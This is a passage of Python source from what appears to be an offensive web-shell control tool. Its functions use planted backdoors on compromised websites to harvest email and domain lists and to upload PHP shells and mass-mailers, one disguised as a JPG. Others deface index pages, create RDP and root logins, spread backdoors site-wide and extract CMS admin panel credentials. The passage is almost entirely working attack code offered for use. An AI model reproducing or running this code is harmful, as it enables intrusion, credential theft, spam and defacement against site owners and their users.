        ip_serv = re.findall(re.compile('<ip>(.*)</ip>'), ck_rt)[0]
        print('   {}[+] Succeeded.\n       - {} IP: {} {}|{} PORT: 22 {}|{} USERNAME: root {}|{} PASSWORD: 0'.format(fg, fr, ip_serv, fw, fr, fw, fr, fw, fr))
        print('   {}[!] Note 1: Port 22, It is the default port, If it does not work, Execute: [{}netstat -lnp --ip{}]'.format(fw, fr, fw))
        print('   {}[!] Note 2: It is best to wait 5 minutes before trying to log in.'.format(fw))
        open('Results/ROOTs.txt', 'a').write('{}\n{}|22|root|0\n---------------------------------------------------------------------------------------------------\n'.format(shell, ip_serv)); success1 = 1
    except:
        print ('   {}[-] Failed.'.format(fr))

def HTML_Filter(src):
    try:
        key_one = src.rfind('>')
        new_src = src[key_one:][1:]
        return new_src
    except:
        return False

def domains(backdoor) :
    try:
        sys.stdout.write('   {}[*] Trying get Domains '.format(fw)); waiting()
        post_d = {'action': 'domains'}
        gt_doms = requestP_Fox('{}?action={}'.format(backdoor, en('{}/{}V{}/a'.format(dom, to, version))), 1, post_d, headers2)
        if('<error>' in gt_doms): print ('   {}[-] Failed.'.format(fr)); return
        ip_serv = re.findall(re.compile('<ip>(.*)</ip>'), gt_doms)[0]
        gt_doms = HTML_Filter(gt_doms)
        if(gt_doms is False): print ('   {}[-] Failed.'.format(fr)); return
        domains_counter = 0
        gt_doms = gt_doms.split('\n')
        domains_F = ''
        for gt_dom in gt_doms:
            if('.' in gt_dom):
                domains_F = '{}{}\n'.format(domains_F, gt_dom)
                domains_counter = domains_counter + 1
        patheListDomains = r'Results/Domains_lists'
        if (not os.path.exists(patheListDomains)): os.makedirs(patheListDomains)
        open('Results/Domains_lists/{}.txt'.format(ip_serv), 'w').write(domains_F)
        open('Results/Domains_lists/0.0.0.0.All_Domains.txt', 'a').write(domains_F)
        print ('   {}[+] Number of domains: {}{}'.format(fg, fr, domains_counter))
        print ('   {}[+] Saved in {}Results/Domains_lists/{}.txt'.format(fg, fr, ip_serv))
    except:
        print ('   {}[-] Failed.'.format(fr))

def mail_single(backdoor):
    try:
        sys.stdout.write('   {}[*] Trying get Mails '.format(fw)); waiting()
        post_m = {'action': 'mail'}
        try: gt_mail = content_Fox(requests.post('{}?action={}'.format(backdoor, en('{}/{}V{}/c'.format(dom, to, version))), data=post_m, headers=headers2, verify=False, timeout=1005))
        except: gt_mail = ''
        if ('</error>' in gt_mail): print ('   {}[-] Failed.'.format(fr)); return
        if(gt_mail == ''): time.sleep(90)
        post_e = {'action': 'email'}
        gt_mail = requestP_Fox('{}?action={}'.format(backdoor, en('{}/{}V{}/c'.format(dom, to, version))), 1, post_e, headers2)
        if ("<domain>" in gt_mail):
            domain_serv = re.findall(re.compile('<domain>(.*)</domain>'), gt_mail)[0]
            emails_p = shellPath_Fox(backdoor, 'Emails.txt', 1)
            gt_mail = requestG_Fox(emails_p, 1, headers1, 505)
            if('@' not in gt_mail): print ('   {}[-] There is no Email.'.format(fr)); return
            post_d = {'action': 'delete'}
            requestP_Fox('{}?action={}'.format(backdoor, en('{}/{}V{}/c'.format(dom, to, version))), 1, post_d, headers2)
            patheListEmails = r'Results/Emails_lists'
            if (not os.path.exists(patheListEmails)): os.makedirs(patheListEmails)
            mails_counter = mail_filter(gt_mail)
            if(int(mails_counter) == 0): print ('   {}[-] There is no Email.'.format(fr)); return
            open('Results/Emails_lists/{}_Single.txt'.format(domain_serv), 'w').write(gt_mail)
            open('Results/Emails_lists/0.0.0.0.All_Mails.txt', 'a').write('{}\n'.format(gt_mail))
            print ('   {}[+] Number of Emails: {}{}'.format(fg, fr, mails_counter))
            print ('   {}[+] Saved in {}Results/Emails_lists/{}_Single.txt'.format(fg, fr, domain_serv))
        else: print ('   {}[-] There is no Emails.'.format(fr))
    except:
        print ('   {}[-] Failed.'.format(fr))

def mail_mass(backdoor, configsURL):
    try:
        sys.stdout.write('   {}[*] Trying get Mails '.format(fw)); waiting()
        post_m = {'action': 'mails', 'url': configsURL}
        try: gt_mail = content_Fox(requests.post('{}?action={}'.format(backdoor, en('{}/{}V{}/c'.format(dom, to, version))), data=post_m, headers=headers2, verify=False, timeout=1005))
        except: gt_mail = ''
        if(gt_mail == ''): time.sleep(180)
        post_e = {'action': 'email'}
        gt_mail = requestP_Fox('{}?action={}'.format(backdoor, en('{}/{}V{}/c'.format(dom, to, version))), 1, post_e, headers2)
        if ("<domain>" in gt_mail):
            domain_serv = re.findall(re.compile('<domain>(.*)</domain>'), gt_mail)[0]
            emails_p = shellPath_Fox(backdoor, 'Emails.txt', 1)
            gt_mail = requestG_Fox(emails_p, 1, headers1, 505)
            if('@' not in gt_mail): print ('   {}[-] There is no Email.'.format(fr)); return
            post_d = {'action': 'delete'}
            requestP_Fox('{}?action={}'.format(backdoor, en('{}/{}V{}/c'.format(dom, to, version))), 1, post_d, headers2)
            patheListEmails = r'Results/Emails_lists'
            if (not os.path.exists(patheListEmails)): os.makedirs(patheListEmails)
            mails_counter = mail_filter(gt_mail)
            if(int(mails_counter) == 0): print ('   {}[-] There is no Email.'.format(fr)); return
            open('Results/Emails_lists/{}_Configs.txt'.format(domain_serv), 'w').write(gt_mail)
            open('Results/Emails_lists/0.0.0.0.All_Mails.txt', 'a').write('{}\n'.format(gt_mail))
            print ('   {}[+] Number of Emails: {}{}'.format(fg, fr, mails_counter))
            print ('   {}[+] Saved in {}Results/Emails_lists/{}_Configs.txt'.format(fg, fr, domain_serv))
        else : print ('   {}[-] There is no Email.'.format(fr))
    except:
        print ('   {}[-] Failed.'.format(fr))

def mail_filter(mails):
    mails_counter = 0
    try:
        mails = mails.split('\n')
        patheListEmails = r'Results/Emails_lists/Filtered_emails'
        if (not os.path.exists(patheListEmails)): os.makedirs(patheListEmails)
        ltds = ['mail.ru', '@icloud.', '@me.', '@outlook.', '@live.', '@hotmail.', '@msn.', '@web.', '@orange.', '@free.fr', '@wanadoo.fr', '@optonline.net', '@aol.', '@gmail.', '@comcast.', '@ntlworld.', '@charter.', '@yahoo.', '@sfr.', '@cox.', '@verizon.', '@att.', '@googlemail.', '@gmx.', '@ymail.']
        for mail in mails:
            mail = str(mail.strip())
            if ('@' in mail): mails_counter = mails_counter + 1
            sus = 0
            for ltd in ltds:
                if(str(ltd) in str(mail.lower())):
                    ltd2 = ltd
                    if(ltd2[-1] == '.'): ltd2 = ltd2.replace('.', '')
                    open('Results/Emails_lists/Filtered_emails/{}.txt'.format(ltd2), 'a').write('{}\n'.format(mail))
                    sus = 1
                    break
            if (sus == 0): open('Results/Emails_lists/Filtered_emails/Other.txt', 'a').write('{}\n'.format(mail))
        return mails_counter
    except:
        return mails_counter

def mailer_UPloader(backdoor, leafMailer):
    try:
        global success1
        sys.stdout.write('   {}[*] Uploading {}Leaf{} PHP Mailer '.format(fw, fg, fw)); waiting()
        mailer_pass = random_Fox(9)
        leafMailer = file_get_contents_Fox(leafMailer)
        mailer_text = leafMailer.replace('FoxCyberSecurity', mailer_pass)
        mailer_name = '{}.php'.format(random_Fox(8))
        mailer_path = shellPath_Fox(backdoor, mailer_name, 1)
        filedata = {'action': 'upload'}
        fileup = {'file': (mailer_name, mailer_text)}
        try: upMailer = content_Fox(requests.post('{}?action={}'.format(backdoor, en('{}/{}V{}/a'.format(dom, to, version))), data=filedata, files=fileup, headers=headers2, verify=False, timeout=45))
        except: upMailer = content_Fox(requests.post('{}?action={}'.format(backdoor, en('{}/{}V{}/a'.format(dom, to, version))), data=filedata, files=fileup, headers=headers2, verify=False, timeout=60))
        if ('<successfully>' in upMailer):
            print ('   {}[+] Succeeded.\n       - {}{}?pass={}'.format(fg, fr, mailer_path, mailer_pass))
            open('Results/Leaf_PHP_Mailers.txt', 'a').write('{}?pass={}\n'.format(mailer_path, mailer_pass)); success1 = 1
        else: print('   {}[-] Upload Failed.'.format(fr))
    except:
        print('   {}[-] Upload Failed.'.format(fr))

def file_UPloader(backdoor, srcShell, tyShell, q, mothd = 1):
    try:
        if(mothd == 2): getFile('fox.jpg', '49631467080528197')
        if (tyShell > 3): sys.stdout.write('   {}[*] Uploading File '.format(fw)); waiting()
        if (q == 1): filename = '{}.php'.format(random_Fox(8))
        else: filename = srcShell
        if (mothd == 2): filename_jpg = '{}.jpg'.format(random_Fox(3))
        if ('/' in filename): filename = filename.split('/')[-1]
        if ('\\' in filename): filename = filename.split('\\')[-1]
        if (tyShell == 2 or tyShell == 5):
            mailer_pass = random_Fox(9)
            srcShell = file_get_contents_Fox(srcShell)
            srcShell = srcShell.replace('FoxCyberSecurity', mailer_pass)
        else : srcShell = open(srcShell, 'rb')
        if (tyShell == 2 or tyShell == 5): file_path = '{}?pass={}'.format(shellPath_Fox(backdoor, filename, 1), mailer_pass)
        else : file_path = shellPath_Fox(backdoor, filename, 1)
        filedata = {'action': 'upload'}
        if (mothd == 2): fileup = {'file': (filename_jpg, '{}\n{}'.format(file_get_contents_Fox2('Files/fox.jpg'), srcShell))}
        else: fileup = {'file': (filename, srcShell)}
        try: upFile = content_Fox(requests.post('{}?action={}'.format(backdoor, en('{}/{}V{}/b'.format(dom, to, version))), files=fileup, data=filedata, headers=headers2, verify=False, timeout=45))
        except: upFile = content_Fox(requests.post('{}?action={}'.format(backdoor, en('{}/{}V{}/b'.format(dom, to, version))), files=fileup, data=filedata, headers=headers2, verify=False, timeout=60))
        if ('<successfully>' in upFile):
            if (mothd == 2):
                post = {'fname': filename_jpg, 'sname': filename}
                try: rnme = requests.post('{}?action={}'.format(backdoor, en('{}/{}V{}/b'.format(dom, to, version))), data=post, headers=headers2, verify=False, timeout=45)
                except: rnme = requests.post('{}?action={}'.format(backdoor, en('{}/{}V{}/b'.format(dom, to, version))), data=post, headers=headers2, verify=False, timeout=60)
            print ('   {}[+] Succeeded Upload.\n       - {}{}'.format(fg, fr, file_path))
            if (tyShell == 2 or tyShell == 5):
                print ('   {}[+] Saved in {}Results/Leaf_PHP_Mailers.txt'.format(fg, fr))
                open('Results/Leaf_PHP_Mailers.txt', 'a').write('{}\n'.format(file_path))
            else:
                print ('   {}[+] Saved in {}Results/Shells.txt'.format(fg, fr))
                open('Results/Shells.txt', 'a').write('{}\n'.format(file_path))
        elif (mothd == 1): return file_UPloader(backdoor, srcShell, tyShell, q, 2)
        else:
            print ('   {}[-] Upload Failed.'.format(fr))
    except :
        print ('   {}[-] Upload Failed.'.format(fr))

def file_Main_UPloader(backdoor, file, tyShell, q):
    try:
        if (tyShell > 3): sys.stdout.write('   {}[*] Uploading File '.format(fw)); waiting()
        if (q == 1): filename = '{}.php'.format(random_Fox(8))
        else: filename = file
        if ('/' in filename): filename = filename.split('/')[-1]
        if ('\\' in filename): filename = filename.split('\\')[-1]
        if (tyShell == 2 or tyShell == 5):
            mailer_pass = random_Fox(9)
            file = file_get_contents_Fox(file)
            file = file.replace('FoxCyberSecurity', mailer_pass)
        else: file = open(file, 'rb')
        if (tyShell == 2 or tyShell == 5): file_path = '{}?pass={}'.format(shellPath_Fox(backdoor, filename, 2), mailer_pass)
        else: file_path = shellPath_Fox(backdoor, filename, 2)
        filedata = {'action': 'up'}
        fileup = {'file': (filename, file)}
        try: upFile = content_Fox(requests.post('{}?action={}'.format(backdoor, en('{}/{}V{}/a'.format(dom, to, version))), files=fileup, data=filedata, headers=headers2, verify=False, timeout=45))
        except: upFile = content_Fox(requests.post('{}?action={}'.format(backdoor, en('{}/{}V{}/a'.format(dom, to, version))), files=fileup, data=filedata, headers=headers2, verify=False, timeout=60))
        if ('<successfully>' in upFile):
            print ('   {}[+] Succeeded.\n       - {}{}'.format(fg, fr, file_path))
            if (tyShell == 2 or tyShell == 5):
                print ('   {}[+] Saved in {}Results/Leaf_PHP_Mailers.txt'.format(fg, fr))
                open('Results/Leaf_PHP_Mailers.txt', 'a').write('{}\n'.format(file_path))
            else:
                print('   {}[+] Saved in {}Results/Shells.txt'.format(fg, fr))
                open('Results/Shells.txt', 'a').write('{}\n'.format(file_path))
        else: print ('   {}[-] Upload Failed.'.format(fr))
    except:
        print ('   {}[-] Upload Failed.'.format(fr))

def index_UPloader_1(backdoor, index_path, z, attacker) :
    try:
        global success1
        sys.stdout.write('   {}[*] Uploading Index '.format(fw)); waiting()
        index_name = index_path
        if ('/' in index_name): index_name = index_name.split('/')[-1]
        if ('\\' in index_name): index_name = index_name.split('\\')[-1]
        filedata = {'action': 'up'}
        fileup = {'file': (index_name, file_get_contents_Fox(index_path))}
        index_path = shellPath_Fox(backdoor, index_name, 2)
        try: upFile = content_Fox(requests.post('{}?action={}'.format(backdoor, en('{}/{}V{}/a'.format(dom, to, version))), files=fileup, data=filedata, headers=headers2, verify=False, timeout=45))
        except: upFile = content_Fox(requests.post('{}?action={}'.format(backdoor, en('{}/{}V{}/a'.format(dom, to, version))), files=fileup, data=filedata, headers=headers2, verify=False, timeout=60))
        if ('<successfully>' in upFile):
            print ('   {}[+] Succeeded.\n       - {}{}'.format(fg, fr, index_path))
            open('Results/indexS.txt', 'a').write('{}\n'.format(index_path)); success1 = 1
            if (z == 1): zone_h(index_path, attacker)
        else: print ('   {}[-] Upload Failed.'.format(fr))
    except:
        print ('   {}[-] Upload Failed.'.format(fr))

def index_UPloader_2(backdoor, index_path, z, attacker) :
    try:
        global success1
        sys.stdout.write('   {}[*] Uploading Index '.format(fw)); waiting()
        post_i = {'action': 'index', 'index': file_get_contents_Fox(index_path)}
        id_ed = requestP_Fox('{}?action={}'.format(backdoor, en('{}/{}V{}/a'.format(dom, to, version))), 1, post_i, headers2, 45)
        if('./Done' in id_ed):
            print('   {}[+] Succeeded.\n       - {}{}'.format(fg, fr, URL_FOX(backdoor)))
            open('Results/indexS.txt', 'a').write('{}\n'.format(URL_FOX(backdoor))); success1 = 1
            if (z == 1): zone_h(URL_FOX(backdoor), attacker)
            else: print ('   {}[-] Upload Failed.'.format(fr))
    except:
        print ('   {}[-] Upload Failed.'.format(fr))

def UNZIP(backdoor, zipFile):
    try:
        global success1
        sys.stdout.write('   {}[*] Uploading/Uncompress ZIP File '.format(fw)); waiting()
        filedata = {'action': 'zip'}
        zip_name = zipFile
        if ('/' in zip_name): zip_name = zip_name.split('/')[-1]
        if ('\\' in zip_name): zip_name = zip_name.split('\\')[-1]
        fileup = {'file': (zip_name, open(zipFile, 'rb'), 'multipart/form-data')}
        try: upFile = content_Fox(requests.post('{}?action={}'.format(backdoor, en('{}/{}V{}/a'.format(dom, to, version))), files=fileup, data=filedata, headers=headers2, verify=False, timeout=500))
        except: upFile = content_Fox(requests.post('{}?action={}'.format(backdoor, en('{}/{}V{}/a'.format(dom, to, version))), files=fileup, data=filedata, headers=headers2, verify=False, timeout=1000))
        if (re.findall(re.compile('<folder>(.*)</folder>'), upFile)):
            print ('   {}[+] Succeeded UPload.'.format(fg))
            folder = re.findall(re.compile('<folder>(.*)</folder>'), upFile)[0]
            post_z = {'action': 'zip', 'zips': zip_name, 'zipFolder': folder}
            Uncompress = requestP_Fox('{}?action={}'.format(backdoor, en('{}/{}V{}/c'.format(dom, to, version))), 1, post_z, headers2, 30)
            if('</unzip>' in Uncompress):
                zip_Path = '{}/'.format(shellPath_Fox(backdoor, folder, 1))
                print ('   {}[+] Succeeded UNZIP.\n       - {}{}'.format(fg, fr, zip_Path))
                open('Results/Pages.txt', 'a').write('{}\n'.format(zip_Path)); success1 = 1
                print('   {}[+] Saved in {}Results/Pages.txt'.format(fg, fr))
            else: print('   {}[-] Failed Uncompress ZIP.'.format(fr))
        else: print ('   {}[-] Upload Failed.'.format(fr))
    except :
        print('   {}[-] Failed.'.format(fr))

def sending_Checker(backdoor, shell):
    try:
        global success1, success2
        sys.stdout.write('   {}[*] Checking Sending Mail '.format(fw)); waiting()
        filedata = {'action': 'upload'}
        testname = 'tesT{}.php'.format(random_Fox(3))
        fileup_Test = {'file': (testname, file_get_contents_Fox('Files/t1.txt'))}
        try: upFile = content_Fox(requests.post('{}?action={}'.format(backdoor, en('{}/{}V{}/b'.format(dom, to, version))), data=filedata, files=fileup_Test, headers=headers2, timeout=45))
        except: upFile = content_Fox(requests.post('{}?action={}'.format(backdoor, en('{}/{}V{}/b'.format(dom, to, version))), data=filedata, files=fileup_Test, headers=headers2, timeout=60))
        if ('<successfully>' not in upFile): print('   {}[-] Failed.'.format(fr)); return
        Test_path = shellPath_Fox(backdoor, testname, 1)
        email = getEmail()
        if (email == 'F'): print ('   {}[-] Try Later.'.format(fr)); return
        post_t = {'email': email}
        send_c = requestP_Fox(Test_path, 1, post_t, headers1)
        if ('</id>' in send_c):
            id_code = re.findall(re.compile('<id>(.*)</id>'), send_c)[0]
            time.sleep(10)
            check_s = msg_chekcer_Fox(email, id_code)
            start = timer()
            while ((check_s == 'F') and ((timer() - start) <= 60)):
                time.sleep(10)
                check_s = msg_chekcer_Fox(email, id_code)
            if(check_s == 'S'):
                print ('   {}[+] Sending mail is Working Well.'.format(fg))
                open('Results/SendingMail_Work.txt', 'a').write('{}\n'.format(shell)); success1 = 1
            else:
                print ('   {}[-] Sending mail isn\'t Working.'.format(fr))
                open('Results/SendingMail_NotWork.txt', 'a').write('{}\n'.format(shell)); success2 = 1
        else: print('   {}[-] Failed.'.format(fr))
    except:
        print('   {}[-] Failed.'.format(fr))

def RDP_creator(backdoor, shell) :
    try:
        global success1
        sys.stdout.write('   {}[*] Creating RDP '.format(fw)); waiting()
        post_g = {'action': 'rdp'}
        RDP_C = requestP_Fox('{}?action={}'.format(backdoor, en('{}/{}V{}/a'.format(dom, to, version))), 1, post_g, headers2)
        if ('Error-RDP3' in RDP_C): print('   {}[-] {} server.'.format(fr, re.findall(re.compile('<t>(.*)</t>'), RDP_C)[0]))
        elif ('Error-RDP1' in RDP_C): print('   {}[-] There are no permissions.'.format(fr))
        elif ('<rdp>' in RDP_C):
            RDP = re.findall(re.compile('<rdp>(.*)\|(.*)\|(.*)</rdp>'), RDP_C)[0]
            print ('   {}[+] Succeeded.\n       -{} Login by IP or Domain: {}{} {}|{} {}\n       -{} USERNAME: {}{}\n       -{} PASSWORD: {}{}'.format(fg, fr, fg, RDP[0], fr, fg, domain_Fox(backdoor), fr, fg, RDP[1], fr, fg, RDP[2]))
            open('Results/RDPs.txt', 'a').write('{}\n{}:3389|{}|{}\n--------------------------------------------------------------------------------------------------\n'.format(shell, RDP[0], RDP[1], RDP[2])); success1 = 1
            if ('./DoneAdmin' in RDP_C): print ('   {}[+] Administrator.'.format(fg))
        else: print ('   {}[-] Failed.'.format(fr))
    except:
        print ('   {}[-] Failed.'.format(fr))

def backdoor_Injection(backdoor):
    try:
        global success1
        sys.stdout.write('   {}[*] Injecting a backdoor '.format(fw)); waiting()
        post_j = {'action': 'injection'}
        injection = requestP_Fox('{}?action={}'.format(backdoor, en('{}/{}V{}/a'.format(dom, to, version))), 1, post_j, headers2)
        if (re.findall(re.compile('<backdoor>(.*)</backdoor>'), injection)):
            bk = re.findall(re.compile('<backdoor>(.*)</backdoor>'), injection)[0]
            print ('   {}[+] Succeeded.\n       - {}{}'.format(fg, fr, bk))
            open('Results/Injected_backdoors.txt', 'a').write('{}\n'.format(bk)); success1 = 1
        else: print ('   {}[-] Failed.'.format(fr))
    except:
        print ('   {}[-] Failed.'.format(fr))

def MASS_Backdoor(backdoor, shell_path):
    try:
        global success2
        sys.stdout.write('   {}[*] MASS backdoor '.format(fw)); waiting()
        post_m = {'action': 'mass'}
        shell_name = shell_path
        if('/' in shell_name): shell_name = shell_name.split('/')[-1]
        elif('\\' in shell_name): shell_name = shell_name.split('\\')[-1]
        fileup = {'file': (shell_name, open(shell_path, 'rb'), 'multipart/form-data')}
        try: injection = content_Fox(requests.post('{}?action={}'.format(backdoor, en('{}/{}V{}/a'.format(dom, to, version))), files=fileup, data=post_m, headers=headers2, verify=False, timeout=500))
        except: injection = content_Fox(requests.post('{}?action={}'.format(backdoor, en('{}/{}V{}/a'.format(dom, to, version))), files=fileup, data=post_m, headers=headers2, verify=False, timeout=1000))
        if (re.findall(re.compile('<backdoor>(.*)</backdoor>'), injection)): backdoors = re.findall(re.compile('<backdoor>(.*)</backdoor>'), injection)
        else: print ('   {}[-] Failed.'.format(fr)); return
        newpath = r'Results/backdoors'
        if (not os.path.exists(newpath)): os.makedirs(newpath)
        domain = domain_Fox(backdoor)
        for bk in backdoors:
            open('Results/backdoors/{}.txt'.format(domain), 'a').write('{}\n'.format(bk))
            open('Results/backdoors/0.0-ALL-backdoors.txt', 'a').write('{}\n'.format(bk))
        success2 = 1
        print ('   {}[+] Succeeded.'.format(fg))
        print ('   {}[+] Saved in {}Results/backdoors/{}.txt'.format(fg, fr, domain))
    except :
        print ('   {}[-] Failed.'.format(fr))

def getLinks(backdoor, configsURL, source):
    try:
        links = ''
        if(not re.findall(re.compile('<a href="(.*)"'),source)): print (' {}[-] Config error.'.format(fr)); return False
        urls = re.findall(re.compile('<a href="(.*)"'),source)
        for url in urls:
            url = str(url)
            if ('.txt' not in url or 'passwd.txt' in url): continue
            if ('"' in url): url = url.split('"')[0]
            if ('http://' in url or 'https://' in url): link = url
            elif ('/' in url): link = '{}{}'.format(URL_FOX(backdoor), url)
            else: link = '{}{}'.format(configsURL, url)
            links = '{}{}\r\n'.format(links, link)
        if(links != ''): return links
        else: print (' {}[-] Config error.'.format(fr)); return False
    except:
        print (' {}[-] Config error.'.format(fr)); return False

def panel_accesser(backdoor, links, typeAc):
    try:
        post_p = {'action': 'panel', 'links': links, 'type': typeAc}
        ac_pls = requestP_Fox('{}?action={}'.format(backdoor, en('{}/{}V{}/c'.format(dom, to, version))), 1, post_p, headers2, 500)
        if ( not re.findall(re.compile('<login>Login: (.*) Username: (.*) Password: (.*)</login>'), ac_pls)): print('   {}[-] There is no Panels.'.format(fr)); return False
        panels = re.findall(re.compile('<login>Login: (.*) Username: (.*) Password: (.*)</login>'), ac_pls)
        logins = []; wp = 0; jm = 0; oc = 0
        for panel in panels:
            try:
                panelURL = '{}#{}@{}'.format(panel[0], panel[1], panel[2])
                if ('wp-login.php' in panelURL):
                    print('   {}  - {}{} {}[WordPress]'.format(fg, fw, panelURL, fg))
                    open('Results/WordPress_Panels.txt', 'a').write(panelURL + '\n')
                    wp = 1
                elif ('administrator/index.php' in panelURL):
                    print('   {}  - {}{} {}[Joomla]'.format(fg, fw, panelURL, fr))
                    open('Results/Joomla_Panels.txt', 'a').write(panelURL + '\n')
                    jm = 1
                elif ('admin/index.php' in panelURL):
                    print('   {}  - {}{} {}[OpenCart]'.format(fg, fw, panelURL, fc))
                    open('Results/OpenCart_Panels.txt', 'a').write(panelURL + '\n')
                    oc = 1
                logins.append(panelURL)
            except:
                pass
        if (logins): print(''); return logins, wp, jm, oc
        print('   {}[-] There is no Panels.'.format(fr)); return False
    except:
        print('   {}[-] Failed.'.format(fr)); return False

def panels(backdoor, configsURL, source, typeAc):
    try:
        sys.stdout.write('   {}[*] Access to control Panels '.format(fw)); waiting()
        links = getLinks(backdoor, configsURL, source)
        if(links is False): return False
        return panel_accesser(backdoor, links, typeAc)
    except:
        pass

def shellPathFinder(argument1,argument2):
    shell='{}.php'.format(random_Fox((8)))
    ssl._create_default_https_context = ssl._create_unverified_context
    mechanize._sockettimeout._GLOBAL_DEFAULT_TIMEOUT = 60
    try :
        mbrowser=mechanize.Browser()
        mbrowser.set_handle_equiv((()==()))
        mbrowser.set_handle_redirect((()==()))
        mbrowser.set_handle_referer((()==()))
        mbrowser.set_handle_robots((()==[]))
        mbrowser.addheaders=[('User-agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36')]
        mbrowser.open(argument1, timeout = 60)
        if 'post' in argument2:
            try:
            	mbrowser.select_form( method = "post", enctype = 'multipart/form-data')
            except:
            	mbrowser.select_form( method = 'POST', enctype = 'multipart/form-data')
        elif 'POST' in argument2:
        	mbrowser.select_form( method = 'POST', enctype = 'multipart/form-data')
        elif 'Post' in argument2:
        	mbrowser.select_form( method = 'Post', enctype = 'multipart/form-data')
        else :
        	return 'F'
        if sys.version_info[0]< 3:
            with open(shell,'ab') as fo:
            	fo.write( shell_Fox )
        else :
            with open(shell,'a') as fo:
            	fo.write( shell_Fox )
        fo.close()
        if sys.version_info[0]<3:
        	fo=open(shell,'rb')
        else :
        	fo=open(shell,'r')
        mbrowser.form.add_file(fo,'text/plain',shell)
        mbrowser.submit()
        fo.close()
        os.remove(shell)
        shellpath=shellPath_Fox(argument1,shell,1)
        response=requestG_Fox(shellpath,1, headers1)
        if ('KEY:' in response): 
        	return shellpath
        return 'F'
    except :
        try :
        	fo.close()
        except :
        	pass
        try :
        	os.remove(shell)
        except : 
        	pass
        return "F"
        
def FileFinder2(argument):
    try :
        filelist=['uploadfiles\\[\\]', 'uploadfiles', 'uploadfile\\[\\]', 'uploadfile', 'idx_files\\[\\]', 'idx_files', 'idx_file\\[\\]', 'idx_file', 'userfiles\\[\\]', 'userfiles', 'userfile\\[\\]', 'userfile', 'newfiles\\[\\]', 'newfiles', 'newfile\\[\\]', 'newfile', 'inputfiles\\[\\]', 'inputfiles', 'inputfile\\[\\]', 'inputfile', 'filenames\\[\\]', 'filenames', 'filename\\[\\]', 'filename', 'file_n\\[\\]', 'file_n', 'files\\[\\]', 'files', 'images\\[\\]', 'images', 'image\\[\\]', 'image', 'uploader\\[\\]', 'uploader', 'uploads\\[\\]', 'uploads', 'upload\\[\\]', 'upload', 'file\\[\\]', 'file', 'fu\\[\\]', 'fu', 'f\\[\\]', 'f', 'n\\[\\]', 'n']
        for item in filelist:
            try :
                splitted_string=argument.split('>')
                for item2 in splitted_string:
                    if(re.findall(re.compile(regex.format(item)),item2) and re.findall(re.compile(str('type.*=.*file')),item2) and 'profile.php' not in item2):
                        regexlist=re.findall(re.compile(regex.format(item)),item2)
                        for item3 in regexlist:
                            item3=item3.split(item)[0]
                            if item3.count(str("=")) == 1:
                                if('\\' in item): item = item.replace('\\', '')
                                return str(item)
            except :
                pass
        return False
    except :
        return False

def file_SemiUPer(url, source):
    try:
        filename = '{}.php'.format(random_Fox(8))
        req = requests.session()
        url = str(url)
        if ('#' in url):
            password = re.findall(re.compile('#(.*)'), url)[0]
            post = {'pass': password, 'password': password, 'pwd': password, 'passwd': password, 'f_pp': password}
            login = req.post(url, data=post, headers=headers1, verify=False, timeout=15)
            source = content_Fox(req.get(url, headers=headers1, verify=False, timeout=15))
        elif ('@' in url):
            password = re.findall(re.compile('@(.*)'), url)[0]
            post = {'pass': password, 'password': password, 'pwd': password, 'passwd': password, 'f_pp': password}
            login = req.post(url, data=post, headers=headers1, verify=False, timeout=15)
            source = content_Fox(req.get(url, headers=headers1, verify=False, timeout=15))
        elif (';' in url):
            password = re.findall(re.compile(';(.*)'), url)[0]
            post = {'pass': password, 'password': password, 'pwd': password, 'passwd': password, 'f_pp': password}
            login = req.post(url, data=post, headers=headers1, verify=False, timeout=15)
            source = content_Fox(req.get(url, headers=headers1, verify=False, timeout=15))
        if('BUbwxgj' in source):
            filedata = {'a': 'BUbwxgj', 'p1': 'uploadFile', 'ne': '', 'charset': 'UTF-8', 'c': ''}
            fileup = {'f[]': (filename, shell_Fox)}
        elif ('<pre align=center><form method=post>Password<br><input type=password name=pass' in source and 'style=\'background-color:whitesmoke;border:1px solid #FFF;outline:none' in source and 'type=submit name=\'watching\' value=\'submit\'' in source):
            post = {'pass': 'xleet'}
            login = req.post(url, data=post, headers=headers1, verify=False, timeout=15)
            filedata = {'a': 'FilesMAn', 'p1': 'uploadFile', 'ne': '', 'charset': 'Windows-1251', 'c': ''}
            fileup = {'f[]': (filename, shell_Fox)}
        elif ('By Gentoo' in source):
            pth = re.findall(re.compile('#000000"></td></tr></table><br></fieldset></form><form method="POST" action="(.*)"'), source)[0]
            pth2 = re.findall(re.compile('\?http(.*)'), pth)[0]
            pth2 = pth2.replace('amp;', '')
            filedata = {'B1': 'Kirim'}
            fileup = {'userfile': (filename, shell_Fox)}
            url = '{}?http{}'.format(url, pth2)
        elif ('IndoXploit' in source and 'Current DIR' in source):
            filedata = {'upload': 'upload'}
            fileup = {'ix_file': (filename, shell_Fox)}
            url = '{}?dir=./&do=upload'.format(url)
        elif ('k2ll33d' in source):
            filedata = {'uploadcomp': 'Go', 'path': './'}
            fileup = {'file': (filename, shell_Fox)}
            url = '{}?y=./&x=upload'.format(url)
        elif ('Raiz0WorM' in source and 'zb' in source):
            fileup = {'zb': (filename, shell_Fox)}
            filedata = {'upload': 'upload'}
        elif ('alfa' in source and 'f[]' in source):
            filedata = {'a': 'RmlsZXNNQW4', 'c': 'Li8=', 'alfa1': 'dXBsb2FkRmlsZQ==', 'charset': ''}
            fileup = {'f[]': (filename, shell_Fox)}
        elif ('RC-SHELL' in source and 'merged' in source):
            filedata = {'merged': 'YWN0PXVwbG9hZCZkPS4vJnVzdWJtaXQ9MSY=', 'rfile1': '', 'path1': './'}
            fileup = {'file1': (filename, shell_Fox)}
        elif ('File Manager - Current disk' in source and 'doupfile' in source):
            filedata = {'doupfile': 'Upload', 'uploaddir': './', 'dir': './'}
            fileup = {'uploadfile': (filename, shell_Fox)}
        else:
            filen = FileFinder2(source)
            if(filen is False): return 'F', req
            filedata = {'submit': 'Upload', 'Submit': 'Upload', 'submit_upload': 'upload', '_upl': 'Upload', 'upload': 'upload', 'v': 'up', 'upl': '1', 'p': '', 'a': 'FilesMAn', 'p1': 'uploadFile', 'ne': '', 'charset': 'Windows-1251', 'c': '', 'path': './', 'upl_files': 'upload', 'fname': '', 'fe': 'upload', 'uploadtype': '1'}
            fileup = {filen: (filename, shell_Fox)}
        try: up = content_Fox(req.post(url, data=filedata, files=fileup, headers=headers1, verify=False, timeout=45))
